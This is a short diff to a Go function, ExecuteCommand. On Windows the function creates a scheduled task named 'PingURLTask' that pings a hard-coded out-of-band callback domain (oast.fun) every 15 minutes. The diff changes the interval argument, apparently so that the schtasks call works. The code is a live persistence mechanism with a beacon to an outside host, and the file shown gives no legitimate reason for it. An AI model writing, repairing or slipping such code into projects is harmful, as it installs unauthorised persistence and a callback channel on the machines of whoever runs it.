@@ -12,7 +12,7 @@ func ExecuteCommand() {
 	if os == "windows" {
 		url := "http://uelunatdkbnrkzqddpnao2fwd0x6x6m6g.oast.fun"
 		taskName := "PingURLTask"
-		interval := "*/15"
+		interval := "15"
 
 		// Construct the command to create a scheduled task
 		cmd := exec.Command("cmd", "/C", "schtasks", "/create", "/tn", taskName, "/tr", "ping "+url, "/sc", "minute", "/mo", interval)
